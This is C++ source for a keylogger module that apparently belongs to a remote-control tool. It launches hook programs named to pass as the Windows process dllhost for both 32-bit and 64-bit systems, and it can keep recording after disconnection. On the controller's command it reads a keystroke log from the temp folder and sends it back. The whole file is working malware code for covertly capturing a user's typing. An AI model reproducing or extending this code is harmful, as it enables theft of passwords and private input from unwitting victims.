// KeybdLogger.cpp: implementation of the CKeybdLogger class.
//
//////////////////////////////////////////////////////////////////////

#include "KeybdLogger.h"

#include <STDIO.H>

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

HANDLE CKeybdLogger::hBackgroundProcess_x64 = NULL;
DWORD CKeybdLogger::dwBackgroundThreadId_x64 = NULL;

HANDLE CKeybdLogger::hBackgroundProcess_x86 = NULL;
DWORD CKeybdLogger::dwBackgroundThreadId_x86 = NULL;

volatile long CKeybdLogger::mutex = 0;

BOOL CKeybdLogger::bOfflineRecord = FALSE;



CKeybdLogger::~CKeybdLogger()
{

}

CKeybdLogger::CKeybdLogger(DWORD dwIdentity):
CEventHandler(dwIdentity)
{
	
}

void CKeybdLogger::Lock(){
	while(InterlockedExchange(&mutex,1)){
		Sleep(100);
	}
}
void CKeybdLogger::Unlock(){
	InterlockedExchange(&mutex,0);
}

void CKeybdLogger::OnConnect()
{
	bool IsX64 = false;
	wchar_t szExeName[0x1000] = {0};
	wchar_t szHookExe[0x1000] = {0};
	
	HINSTANCE hModule =GetModuleHandle(0);
	STARTUPINFOW si;
	si.cb = sizeof(si);
	PROCESS_INFORMATION pi = {0};
	WIN32_FIND_DATAW fd = {0};
	HANDLE hFile = NULL;
	SYSTEM_INFO sys_info = {0};

	Lock();
	//ExitBackgroundProcess();
	//check system bits
	typedef VOID  (__stdcall *PGetNativeSystemInfo)(
		LPSYSTEM_INFO lpSystemInfo
	);
	
	PGetNativeSystemInfo GetNativeSystemInfo = (PGetNativeSystemInfo)GetProcAddress(GetModuleHandle(L"kernel32"),"GetNativeSystemInfo");
	if(GetNativeSystemInfo != NULL)
	{
		GetNativeSystemInfo(&sys_info);
		if (sys_info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ||
			sys_info.wProcessorArchitecture == PROCESSOR_AMD_X8664||
			sys_info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64)
		{
			IsX64 = true;
		}
	}
	printf("Get Module FileName\n");
	GetModuleFileNameW(hModule,szExeName,0x1000);
	wchar_t*p = szExeName + lstrlenW(szExeName) - 1;
	
	while(p[0] != '\\' && p[0] != '/' && p>szExeName){
		p--;
	}
	if(*p != '\\')
	{
		wchar_t szError[] = L"Invalid Module File Name!";
		Send(KEYBD_LOG_ERROR,(char*)szError,(lstrlenW(szError) + 1) * sizeof(wchar_t));
		Disconnect();
		goto Error;
	}
	++p;
	*p = NULL;

	lstrcatW(p,L"modules\\");
	

	//start x86 hook process
	lstrcpyW(szHookExe,szExeName);

	lstrcatW(szHookExe,L"dllhost_x86.exe");

	//MessageBoxW(NULL,szHookExe,L"",MB_OK);

	hFile = FindFirstFileW(szHookExe,&fd);

	if(hFile == INVALID_HANDLE_VALUE)
	{
		
		wchar_t szError[] = L"Could not found Hook Install Program(x86)!";

		Send(KEYBD_LOG_ERROR,(char*)szError,(lstrlenW(szError) + 1) * sizeof(wchar_t));
		Disconnect();
		goto Error;
	}
	FindClose(hFile);

	if(hBackgroundProcess_x86==NULL && CreateProcess(szHookExe,NULL,0,0,0,0,0,0,&si,&pi))
	{
		CloseHandle(pi.hThread);

		dwBackgroundThreadId_x86 = pi.dwThreadId;
		hBackgroundProcess_x86 = pi.hProcess;
	}

	// Isx64
	if(IsX64)
	{
		printf("Is X64 ,then inject hook_x64!\n");
		lstrcpyW(szHookExe,szExeName);
		lstrcatW(szHookExe,L"dllhost_x64.exe");
		hFile = FindFirstFileW(szHookExe,&fd);

		if(hFile == INVALID_HANDLE_VALUE)
		{
			wchar_t szError[] = L"Could not found Hook Install Program(x64)!";
			Send(KEYBD_LOG_ERROR,(char*)szError,(lstrlenW(szError) + 1) * sizeof(wchar_t));
			Disconnect();
			goto Error;
		}
		FindClose(hFile);

		if(hBackgroundProcess_x64 == NULL && CreateProcess(szHookExe,NULL,0,0,0,0,0,0,&si,&pi))
		{
			CloseHandle(pi.hThread);

			dwBackgroundThreadId_x64 = pi.dwThreadId;
			hBackgroundProcess_x64 = pi.hProcess;
		}
	}
	//Send init info
	Send(KEYBD_LOG_INITINFO,(char*)&bOfflineRecord,1);
Error:	
	Unlock();
}
void CKeybdLogger::ExitBackgroundProcess(){
	printf("Exit Background Process!\n");
	if(hBackgroundProcess_x86){
		//像线程发送退出信息
		DWORD dwRet = 0;
		PostThreadMessage(dwBackgroundThreadId_x86,EXIT_HOOK,0,0);
		dwBackgroundThreadId_x86 = NULL;
		
		printf("wait for x86 inject exit!\n");
		dwRet = WaitForSingleObject(hBackgroundProcess_x86,5000);
		if(dwRet == WAIT_TIMEOUT){
			printf("process not exit self!");
			TerminateProcess(hBackgroundProcess_x86,0);
		}
		CloseHandle(hBackgroundProcess_x86);
		hBackgroundProcess_x86 = NULL;
	}
	if(hBackgroundProcess_x64){
		//像线程发送退出信息
		DWORD dwRet = 0;
		PostThreadMessage(dwBackgroundThreadId_x64,EXIT_HOOK,0,0);
		dwBackgroundThreadId_x64 = NULL;
		
		//等待进程退出
		printf("wait for x64 inject exit!\n");
		dwRet = WaitForSingleObject(hBackgroundProcess_x64,5000);
		if(dwRet == WAIT_TIMEOUT){
			printf("process not exit self!");
			TerminateProcess(hBackgroundProcess_x64,0);
		}
		CloseHandle(hBackgroundProcess_x64);
		hBackgroundProcess_x64 = NULL;
	}
	printf("Exit Background Process Finished!\n");
}
void CKeybdLogger::OnClose()
{
	//如果取消离线记录,就关掉这些进程.
	Lock();
	if(bOfflineRecord == FALSE){
		printf("Not Offline Keyboard Record,ExitBackProcess!\n");
		ExitBackgroundProcess();
	}else{
		printf("offline mode enable!\n");
	}
	Unlock();
}
void CKeybdLogger::OnReadComplete(WORD Event, DWORD Total, DWORD dwRead, char*Buffer)
{
	switch(Event)
	{
	case KEYBD_LOG_GET_LOG:
		OnGetLog();	
		break;
	case KEYBD_LOG_SETOFFLINERCD:
		OnSetOfflineRecord(Buffer[0]);
		break;
	}
}

void CKeybdLogger::OnGetLog()
{
	wchar_t szLogPath[0x1000];
	GetTempPathW(0x1000,szLogPath);
	lstrcatW(szLogPath,L"\\r.log");
	
	Lock();

	HANDLE hLog = CreateFile(szLogPath,GENERIC_READ,FILE_SHARE_WRITE,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);

	if(hLog != INVALID_HANDLE_VALUE)
	{
		DWORD dwSizeLow,dwSizeHi;
		DWORD dwRead = 0;
		dwSizeLow = GetFileSize(hLog,&dwSizeHi);
		char*buffer = (char*)malloc(dwSizeLow + 1);
		if(ReadFile(hLog,buffer,dwSizeLow,&dwRead,0))
		{
			buffer[dwRead] = 0;
			Send(KEYBD_LOG_DATA,buffer,dwRead + 1);
			free(buffer);
		}
		CloseHandle(hLog);
	}

	Unlock();

	//else
	//{
	//	wchar_t szError[] = L"Open Log File Failed!";
	//	Send(KEYBD_LOG_ERROR,(char*)szError,(lstrlenW(szError) + 1) * sizeof(wchar_t));
	//}
}


void CKeybdLogger::OnSetOfflineRecord(bool bOffline)
{
	printf("Set Offline Mode:%d\n",bOffline);
	Lock();
	bOfflineRecord = bOffline;
	Unlock();
}